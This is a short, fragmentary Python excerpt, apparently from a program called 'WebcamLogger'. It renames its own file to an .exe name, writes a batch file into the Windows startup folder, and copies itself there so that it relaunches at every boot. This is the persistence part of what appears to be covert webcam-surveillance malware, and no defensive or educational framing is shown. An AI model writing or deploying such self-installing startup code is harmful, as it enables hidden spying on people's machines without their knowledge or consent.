...
# Rename The Script
os.rename(__file__, 'WebcamLogger.exe')
...
def create_startup_batch():
    ...
    with open(batch_file_path, 'w') as f:
        f.write('@echo off\n')
        f.write(f'python "{os.path.join(startup_folder, "WebcamLogger.exe")}"\n')

    # Copy this script to the startup folder as WebcamLogger.exe
    shutil.copy(sys.argv[0], os.path.join(startup_folder, 'WebcamLogger.exe'))
